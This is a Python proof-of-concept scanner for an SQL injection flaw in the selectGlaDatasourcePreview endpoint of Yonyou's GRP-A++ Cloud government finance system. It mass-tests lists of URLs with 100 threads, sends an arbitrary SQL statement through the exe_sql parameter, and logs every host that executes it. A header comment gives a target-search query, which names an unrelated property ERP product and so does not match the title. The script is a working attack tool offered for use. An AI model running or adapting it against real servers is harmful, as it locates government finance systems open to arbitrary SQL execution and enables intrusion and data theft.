#用友GRPA++Cloud 政府财务云 selectGlaDatasourcePreview SQL注入漏洞
#body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="用友GRPA")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/gla/dataSource/selectGlaDatasourcePreview"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Content-Length': '74',
    }
    data = "exe_sql=SELECT%20999*999&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1"
    try:
        res1 = requests.post(url=target+payload,data=data,verify=False,timeout=10,headers=headers)
        if "998001" in res1.text:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()